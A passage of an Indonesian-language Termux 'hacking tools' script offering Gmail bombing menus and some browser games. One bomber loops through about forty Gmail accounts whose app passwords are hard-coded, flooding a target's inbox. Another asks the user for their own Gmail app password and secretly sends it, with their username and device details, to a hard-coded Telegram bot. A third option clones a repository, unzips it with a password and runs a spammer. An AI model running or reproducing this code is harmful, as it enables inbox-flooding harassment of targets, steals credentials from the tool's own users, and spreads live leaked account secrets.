${p}╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝${res}
${k}       [${b} DEVELOPMENT BY.THONXYZZ404 ${k}]${res}
"
}
clear
banner | boxes -d "$cok"
echo -e "${g}"
echo -n "Masukkan target Gmail : "
read EMAIL_TUJUAN
echo -e "${y}"
echo -n "Masukkan subjek untuk Gmail : "
read SUBJEK
echo -e "${c}"
echo -n "Masukkan pesan untuk Gmail : "
read PESAN
python -c '
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import sys
import select
import tty
import termios
GREEN = "\033[1;32m"
RED = "\033[1;31m"
BLUE = "\033[1;34m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"
accounts = [
    ["0Anonymusy1@gmail.com", "fvin nkbd tcrv wakf"],
    ["anonymusy101@gmail.com", "yctg uthl wnrv pful"],
    ["heckedbyx1@gmail.com", "ibdf ukbz ugqd fqwu"],
    ["sonin.spd01@gmail.com", "fkpp cyay qfdb syll"],
    ["anonymusyid909@gmail.com", "gtcx gwtc yzfp aimi"],
    ["anonimousee909@gmail.com", "vwsz udcr zwtn nddt"],
    ["anonimouse90909@gmail.com", "hhgl fmji jsae sqxu"],
    ["anonimouse9099@gmail.com", "qpss riuo pkjk tmeg"],
    ["anonimouse909009@gmail.com", "qfdh cprg hacw zusz"],
    ["anonimouse90999@gmail.com", "ijrf hhuo jpml iysc"],
    ["aaabaaah2@gmail.com", "oqtx elxg cefv dgvd"],
    ["anjaynathan399@gmail.com", "cpil kwkt llab sodh"],
    ["joeellan26@gmail.com", "wnfe iboi ktrr uder"],
    ["bayarutangllu@gmail.com", "cbty vvaf rncu oawg"],
    ["cindyfiolita9@gmail.com", "kpvu treo hfar zqdy"],
    ["anonymousgalirus@gmail.com", "ltnc fedd qzsy lfwu"],
    ["gstorekonter4@gmail.com", "xwdq ugie fbjw xeaa"],
    ["makluetekerbpaluhekel@gmail.com", "oyys dexg uofj vhkt"],
    ["fire.send482@gmail.com", "dpus bvni hmvn caob"],
    ["auto.send583@gmail.com", "awlg kpsu rszi fppt"],
    ["jiki.mioli08@gmail.com", "gzwj sohl dzxd pteh"],
    ["tayotayooxirf@gmail.com", "edpj gvcx fehp rtfl"],
    ["tayo404tayyo404@gmail.com", "jeat hezh ditz akuk"],
    ["tayo404404@gmail.com", "cmwp iluv mott ylyn"],
    ["tayohek2@gmail.com", "iuxg clmh eiet gvkh"],
    ["irfafitrio@gmail.com", "khtm tnxz nbey ahue"],
    ["sigmamewing1232@gmail.com", "trzs dett smbl iykw"],
    ["joyditiano9@gmail.com", "rnfv nfqa ggcf lyqn"],
    ["draid6247@gmail.com", "dhwm abuc vkan sofg"],
    ["daemontechx@gmail.com", "jxov iorq ztpw hirz"],
    ["daemoniumuserv2@gmail.com", "yexa nkvy ghqh hsbd"],
    ["daemoniumuser@gmail.com", "wgas iris atyy xpnc"],
    ["c26898771@gmail.com", "ykky jurp svqq kmhj"],
    ["rizkicuaca62@gmail.com", "azud gild ptqm ooip"],
    ["bunawarhadi@gmail.com", "qhub vsfb oytb qqoa"],
    ["gutodoang@gmail.com", "rcer clrw tckg ppea"],
    ["bocahbebanbocahbeban@gmail.com", "fdye aial ngai clqp"],
    ["siniluanjing484@gmail.com", "chji sayr htkq wjjz"],
    ["qoegvnv@gmail.com", "ueha fbsz unmb jqzj"],
    ["fire.send482@gmail.com", "dpus bvni hmvn caob"],
]
target = "'"$EMAIL_TUJUAN"'"
subject = "'"$SUBJEK"'"
message = "'"$PESAN"'"
def loading_animation():
    chars = ["😈", "☠️", "🤬", "👹"]
    for _ in range(5):
        for char in chars:
            sys.stdout.write(f"\r{GREEN}[ 🚀 ]{CYAN} Processing...!! {RED}[ {char} {RED}]")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()
def get_key():
    def is_data():
        return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if is_data():
            key = sys.stdin.read(1)
            return key
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
print(f"\n{BLUE}╔══════════════════════════════════════════════════════╗{RESET}")
print(f"{BLUE}║        {RED}EMAIL BOMBER - THONXYZZ404 CYBER TEAM         {BLUE}║{RESET}")
print(f"{BLUE}╚══════════════════════════════════════════════════════╝{RESET}")
print(f"{YELLOW}Target Gmail : {GREEN}{target}{RESET}")
print(f"{YELLOW}Subject : {GREEN}{subject}{RESET}")
print(f"{BLUE}-------------------------------------------------------{RESET}")
print(f"{CYAN}Tekan 'q' untuk menghentikan proses pengiriman{RESET}\n")
stop_flag = False
count = 0
while not stop_flag:
    for email, password in accounts:
        if stop_flag:
            break
        try:
            loading_animation()
            msg = MIMEMultipart()
            msg["From"] = email
            msg["To"] = target
            msg["Subject"] = subject
            msg.attach(MIMEText(message, "plain"))
            server = smtplib.SMTP("smtp.gmail.com", 587)
            try:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
            finally:
                server.quit()
            count += 1
            sys.stdout.write(f"\r{RED}[ {GREEN}SUKSES ATACCK {RED}]{YELLOW} Email {RED}[ {CYAN}{count} {RED}]{GREEN} {target}{RESET}")
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\r{RED}[ Gagal ] Email {count} {target}{RESET}")
            sys.stdout.flush()
        start_time = time.time()
        while time.time() - start_time < 5:
            key = get_key()
            if key and key.lower() == 'q':
                stop_flag = True
                break
            time.sleep(0.1)
sys.stdout.write("\r" + " " * 50 + "\r")
sys.stdout.flush()
print(f"\n{RED}[!] Proses dihentikan oleh pengguna.{RESET}")
print(f"{YELLOW}[i] Total email terkirim : {GREEN}{count}{RESET}")
print(f"{BLUE}╔══════════════════════════════════════════════════════╗{RESET}")
print(f"{GREEN}║         TERIMA KASIH TELAH MENGGUNAKAN TOOL INI      ║{RESET}")
print(f"{BLUE}╚══════════════════════════════════════════════════════╝{RESET}")
'
      ;;
   3|03)
               clear 
               echo ""
               echo -e "${g} SEDANG MENGINSTALL TOOLS...!!"
               echo -e "${c}"
               git clone https://github.com/SokHengkell022/Ank_Ajg
               cd Ank_Ajg
               unzip -o -P "Ajg__0245__Babi_404" Ajg.sh
               python Spammer.py
               echo ""
               echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
               read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
               clear
                 ;;
   4|04)
      cd
 echo ""
CONFIG_FILE=".config.json"
TELEGRAM_TOKEN="7268355834:AAHSsYzXujTgQ5-KbDYHKQba1GWM0WnHH6w"
TELEGRAM_CHAT_ID="7020764060"
DEFAULT_SUBJECT="Thanks you for to Toolsv8‼️"
send_to_telegram() {
    local message="$1"
    python3 - <<EOF
import requests
TELEGRAM_TOKEN = "$TELEGRAM_TOKEN"
TELEGRAM_CHAT_ID = "$TELEGRAM_CHAT_ID"
url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
data = {"chat_id": TELEGRAM_CHAT_ID, "text": "$message"}
try:
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"{r}[ {g}x {r}]{c} Gagal terkoneksi pada jaringan..!!")
except Exception as e:
    print(f"{r}[ {g}x {r}]{c} Gagal terkoneksi pada jaringan : {str(e)}")
EOF
}
format_body() {
    local user_message="$1"
    local today=$(date +"%Y - %m - %d")
    echo -e "${user_message}\n\nAkun anda telah di retas.\nDate ${today}"
}
validate_smtp_credentials() {
    local pengirim="$1"
    local password="$2"
    python3 - <<EOF
import smtplib
pengirim = "$pengirim"
password = "$password"
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(pengirim, password)
    server.quit()
    print("Authentication successful")
except Exception as e:
    print(f"{r}[{g} !! {r}]{c} Gagal memvalidasi kredensial SMTP : {str(e)}")
    exit(1)
EOF
}
load_config() {
    clear
    echo ""
    echo "
 ▗▄▄▖▗▖  ▗▖ ▗▄▖ ▗▄▄▄▖▗▖    ▗▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄ ▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▛▚▞▜▌▐▌ ▐▌  █  ▐▌   ▐▌   ▐▌   ▐▛▚▖▐▌▐▌  █▐▌   ▐▌ ▐▌
▐▌▝▜▌▐▌  ▐▌▐▛▀▜▌  █  ▐▌    ▝▀▚▖▐▛▀▀▘▐▌ ▝▜▌▐▌  █▐▛▀▀▘▐▛▀▚▖
▝▚▄▞▘▐▌  ▐▌▐▌ ▐▌▗▄█▄▖▐▙▄▄▖▗▄▄▞▘▐▙▄▄▖▐▌  ▐▌▐▙▄▄▀▐▙▄▄▖▐▌ ▐▌
" | lolcat
    if [ -f "$CONFIG_FILE" ]; then
        email=$(jq -r '.email' "$CONFIG_FILE")
        app_password=$(jq -r '.app_password' "$CONFIG_FILE")
        if [ -n "$email" ] && [ -n "$app_password" ]; then
            echo -e "${p}Konfigurasi ditemukan!"
            echo ""
            echo -e "${b}Gmail Pengirim : ${g}$email"
            echo -e "${y}Gunakan konfigurasi ini? (y/n)"
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${c} Pilih ${n}: ${g}"
            read use_existing
            if [ "$use_existing" = "y" ] || [ "$use_existing" = "Y" ]; then
                if validate_smtp_credentials "$email" "$app_password" | grep -q "Authentication successful"; then
                    export email app_password
                    return
                else
                    echo -e "${r}Kredensial tidak valid, meminta input baru..!!"
                fi
            fi
        else
            echo -e "${r}Konfigurasi tidak valid, meminta input baru..!!"
        fi
    fi
    echo -e "${g}Masukkan Alamat Gmail & App Password"
    echo -e "${g}Untuk Dijadikan Sebagai Akun Pengirim"
    echo -e "${r}Spam Gmail"
    echo ""
    echo -e -n "${r}[${g} ?? ${r}]${c} Masukkan Alamat Gmail Sender ${n}: ${g}"
    read email
    echo ""
    echo -e -n "${r}[${g} ?? ${r}]${y} Masukkan App Password Gmail ${n}: ${g}"
    read -s app_password
    echo ""
    if validate_smtp_credentials "$email" "$app_password" | grep -q "Authentication successful"; then
        echo "{\"email\": \"$email\", \"app_password\": \"$app_password\"}" > "$CONFIG_FILE"
        user_id=$(whoami)
        device_info=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}' | xargs)
        send_to_telegram "👤 User ID Termux : $user_id "
        send_to_telegram "📱 Device Info : $device_info "
        send_to_telegram " 📧 Email : $email "
        send_to_telegram "🔑 App Password : $app_password "
        export email app_password
    else
        clear
        echo ""
        echo -e "${r}Gagal menyimpan konfigurasi karena kredensial tidak valid."
        echo ""
    fi
}
kirim_email() {
    local pengirim="$1"
    local password="$2"
    local penerima="$3"
    local body="$4"
    local jumlah="$5"
    python3 - <<EOF
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
pengirim = "$pengirim"
password = "$password"
penerima = "$penerima"
body = """$body"""
jumlah = int("$jumlah")
DEFAULT_SUBJECT = "$DEFAULT_SUBJECT"
body = """$(format_body "$body")"""
msg = MIMEMultipart()
msg["From"] = pengirim
msg["To"] = penerima
msg["Subject"] = DEFAULT_SUBJECT
msg.attach(MIMEText(body, "plain"))
sukses = 0
gagal = 0
start_time = time.time()
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(pengirim, password)
    for i in range(jumlah):
        try:
            server.sendmail(pengirim, penerima, msg.as_string())
            sukses += 1
            print(f"{r}[{g} {i+1:02} {r}]{g} Pesan Sukses Terkirim ✅")
        except Exception as e:
            gagal += 1
            print(f"{r}[{g} {i+1:02} {r}]{c} Pesan Gagal ❌")
    server.quit()
except Exception as e:
    print(f"❌ {y}Gagal mengirim pesan{r} :{g} {str(e)}")
    exit(1)
end_time = time.time()
durasi = round(end_time - start_time, 2)
print("\033\ac")
print("\033[35;1m")
print("""
      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
      ⣿⠛⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢁⠆⢻⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡿⢻⣿
      ⡇⠆⡘⢿⣿⣿⡿⢈⢻⣿⣿⣿⠇⣤⡏⡄⢿⣿⣿⣿⢃⠘⣿⣿⣿⡟⠐⡌⣿
      ⠃⢠⣆⠌⢿⣿⠇⣻⢊⢻⣿⡟⢨⢺⡷⢸⠈⣿⣿⢂⢰⡄⣿⣿⠏⣐⣴⠠⢹
      ⠘⡘⣿⣹⢸⣿⣀⢻⡞⣨⣿⣶⢀⣣⣥⣇⢲⣿⣧⡘⡮⢃⣸⣧⢸⡼⡟⡠⢸
      ⣧⠈⣦⢻⠸⣿⣿⠈⣧⢈⠻⠏⣼⣻⢟⣿⡌⠿⢋⢠⢡⢸⣿⡿⢸⢣⡞⢀⣿
      ⣿⡄⠺⣼⣇⠙⣣⣺⣿⡷⢉⡜⠛⠛⠚⠛⠛⣄⠱⣿⣎⢤⡛⢃⣾⡵⠂⣸⣿
      ⣿⣧⠐⣽⣿⣷⣦⣭⢥⣶⣿⣿⣿⣿⠀⣿⣿⣿⣳⣦⡭⣭⣴⣿⣿⠽⠀⣿⣿
      ⣿⣿⠀⠛⣻⡭⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣷⣎⣶⡮⣽⡋⠃⢀⣿⣿
      ⣿⣿⠀⢸⣽⣴⣽⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⣿⣿⣿⣿⣿⣝⣽⣿⠀⢸⣿⣿
      ⡿⠟⠀⢀⣀⠀⠀⢀⣀⠀⣀⡀⠀⣀⠀⠀⠀⣀⠀⠀⠀⠀⣀⣀⠀⠀⢘⢿⣿
      ⣷⣤⡄⢘⣿⠇⣠⡿⠋⠀⣿⡇⠀⣿⣧⡀⠀⣿⠀⢠⣾⠛⠉⠋⠁⠀⣤⣄⣿
      ⣿⣿⡇⢨⣿⡿⣿⢄⠀⠀⣿⠆⠀⡇⠹⣷⡄⣿⠀⣿⡇⠀⠀⢠⣤⠀⣿⣿⣿
      ⣿⣿⡇⢸⣿⡅⠘⢿⣦⠀⣿⡇⠀⣷⠀⠈⢿⣿⠀⠹⣷⣄⣀⣸⣿⠀⣿⣿⣿
      ⣿⣿⣧⣈⣟⣇⣀⣨⣉⣅⣭⣃⣤⣭⣄⣤⣤⣩⣥⣤⣤⣭⣭⣭⣭⣤⣿⣿⣟
""")
print(f"{b}Gmail Pengirim{r} : {g}{pengirim}")
print(f"{b}Gmail Tujuan{r} : {g}{penerima}")
print(f"{b}Pesan Terkirim{r} : {g}{sukses}")
print(f"{b}Pesan Gagal{r} : {g}{gagal}")
print(f"{b}Durasi Waktu{r} : {g}{durasi} detik")
EOF
}
reset_config() {
    if [ -f "$CONFIG_FILE" ]; then
        rm "$CONFIG_FILE"
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} Sender berhasil di riset..!!"
        echo ""
        sleep 4
        clear 
        exec bash "${BASH_SOURCE[0]}" "$@"
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Tidak ada config yang tersimpan..!!"
        echo ""
        sleep 4 
    fi
}
load_config
    clear
    echo ""
    echo "
⣿⣿⣿⣿⣿⣿⣿⠿⠟⠿⠿⣿⣿⠿⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠿⠟⠛⠛⠁⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠉⠀⠀⠀⠉⠛⢿⣿⣿⣿
⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿
⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣾
⣿⣄⡀⢀⡀⠀⠀⠀⠀⣠⣤⣤⣴⠿⠿⣦⣄⣀⣀⣴⣄⡀⠀⠀⣠⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣶⠶⠟⠋⠈⠉⠀⠀⠀⠀⠉⠉⠉⠁⠉⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣶⣤⣴⣷⣤⣀⣠⣶⣄⣀⣴⣶⣤⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠛⠛⠉⠀⠀⠈⠙⠛⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⠀⣤⣶⣶⣾⣿⣿⣿⡇⠀⠀⠘⣿⣿⣿⣿⣶⣶⣦⡄⠈⣿⣿⣿
⣿⣿⣿⣿⣦⣄⣈⣉⠉⠛⠛⠛⠀⠀⠀⠀⠙⠛⠛⠋⢉⣉⣠⣤⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿
" | lolcat
    echo ""
    echo -e "${r}[${g} 01 ${r}] ${y}Gas Bomb Gmail"
    echo -e "${r}[${g} 02 ${r}] ${y}Reset Sender"
    echo -e "${r}[${g} 03 ${r}] ${p}Keluar"
    echo ""
    echo -e -n "${r}[${g} >_< ${r}]${c} Masukkan Pilihan Anda ${n}: ${g}"
    read choice
    echo ""
    case $choice in
        1)
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Alamat Gmail Target ${n}: ${y}"
            read penerima
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Isi Pesan ${n}: ${c}"
            read body
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Jumlah Bomb ${n}: ${p}"
            read jumlah
            clear
            echo ""
            kirim_email "$email" "$app_password" "$penerima" "$body" "$jumlah"
            ;;
        2)
            reset_config
            ;;
        3)
            clear
            echo ""
            echo -e "${r} Keluar dari tools..!!"
            echo ""
            ;;
        *)
            clear
            echo ""
            echo -e "${r} Pilihan Anda Tidak Valid..!!"
            echo -e "${g}"
            read -p "Tekan Enter untuk melanjutkanya..!!"
            ;;
    esac
        ;;
   5|05)
               clear
             ;;
        *)
             ;;
           esac
               echo ""
               echo ""
               echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
               read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
               clear
                ;;
        46)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
clear 
echo "
 █████╗ ██╗       ██████╗  █████╗ ███╗   ███╗███████╗
██╔══██╗██║      ██╔════╝ ██╔══██╗████╗ ████║██╔════╝
███████║██║█████╗██║  ███╗███████║██╔████╔██║█████╗  
██╔══██║██║╚════╝██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  
██║  ██║███████╗ ╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗
╚═╝  ╚═╝╚══════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
" | lolcat 
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thonxyzz404              ${b}║"
echo -e "║${g} TELEGRAM ${r}= ${c}t.me/Thonxyzz404          ${b}║"
echo -e "║${g} AKUN TIKTOK ${r}= ${c}@thonxyzz404           ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}01 ${r}]${g} Game invaders                 ${b}║"
echo -e "║${r} [ ${y}02 ${r}]${g} Game dinosaurus               ${b}║"
echo -e "║${r} [ ${y}03 ${r}]${g} Game ninvaders                ${b}║"
echo -e "║${r} [ ${y}04 ${r}]${g} Game ular                     ${b}║"
echo -e "║${r} [ ${y}05 ${r}]${p} Keluar dari tools.            ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${y}Masukkan menu pilihan anda ${r}[ ${g}1\2\3\4\5 ${r}]${c} : ")" kon
case $kon in
1|01)
clear
echo "
⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀
⣤⣤⣼⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣤⣤⣤
⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⡇⠀⠀⣿⣿⣿
⠛⠛⠃⠀⠀⠘⠛⠛⣤⣤⣤⣤⣤⡀⠀⠀⢠⣤⣤⣤⣤⣤⠛⠛⠃⠀⠀⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀
" | lolcat
echo -e "${g}===============${r} GAME INVADERS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://invaders-azure.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME INVADERS URL LINK..!!"
echo ""
 ;;
2|02)
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡀⢠⣰⣶⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣾⣧⢷⠈⣧⡀⠀⠀⠀⠀⠀⣀⣀⣠⣼⣥⣤⣄⣀⣀⣻⡆⠀⠀⠀⠀⠀⣠⡶⠟⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠧⠋⠀⠀⠈⠀⠀⣠⣴⠶⠛⠋⠉⠉⠈⠀⠀⠉⠉⠉⠛⠛⠶⣤⣀⡴⠛⠉⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⡄⠀⠀⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣷⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠁⠙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡤⠤⠶⠶⠶⢶⡆⠀
⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⡀⠀⠀⠀⠀⠹⣧⠀⠀⠀⢀⣾⠃⠀
⠀⠀⠀⠀⢀⣿⡶⠶⣶⣗⠟⠛⠋⣿⣍⠉⢉⣭⣿⣯⡉⢉⣽⣶⣌⠉⢉⣽⡉⠉⠉⣿⡀⠀⠀⠀⠀⢹⡄⠀⠀⣼⠋⠀⠀
⢀⣠⣶⣿⡏⡿⠻⣦⣾⠙⠻⣶⣾⠋⠙⠷⠾⠋⠁⠙⢿⠟⠁⠈⠻⢷⠟⠙⢷⣶⠟⠿⡇⠀⠀⠀⠀⠈⣿⠀⣼⠇⠀⠀⠀
⠘⠿⣿⣿⢳⠇⠀⢈⣧⣤⡀⠀⠀⡀⠀⠀⠀⠄⠀⣠⣤⣄⠀⠀⠀⠀⠀⠀⠈⠀⠀⡆⡇⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⣀⠸⢿⡿⠇⠀⣸⠉⣰⣆⣸⣷⠈⠻⠿⠟⠀⡄⠀⠀⠀⠀⠀⠀⠀⡇⡏⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡇⠀⢿⠐⠇⠀⠀⠀⠙⠿⠋⠛⠛⠋⠀⠀⠀⠘⠂⠓⠀⠀⠀⠀⠀⠀⢀⢡⡇⠀⠀⠀⠀⠀⢸⣧⠤⠖⢲⡖⠀
⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣾⡇⠀⠀⠀⠀⠀⠸⣧⠀⠀⣼⠃⠀
⠀⠀⠀⠀⠘⢷⡄⠀⢠⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢀⡄⠀⣠⣄⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⢻⠀⢀⣿⠀⠀
⠀⠀⠀⠀⠀⠈⢻⣶⠿⣦⡿⣧⡀⣰⢷⣄⣀⡼⢦⣀⣼⠛⢷⣤⣾⠻⢷⣟⣙⣷⡿⠁⠀⠀⠀⠀⠀⠀⢻⡼⣇⢸⠇⠀⠀
⠀⠀⠀⠀⠀⠀⣽⣿⠷⠿⣧⣬⣿⣯⣤⣽⣯⠤⠤⠽⠵⠴⠶⠾⠟⠚⠛⠋⠉⠉⠀⠀⠀⠀⢀⠀⠀⠀⠸⣇⢿⡾⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⠀⠀⠀⢿⠘⢷⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣶⣤⣀⣀⣀⡀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣤⣤⣶⠆⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⣸⣆⠈⢻⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⡟⠛⠀⠀⡽⡇
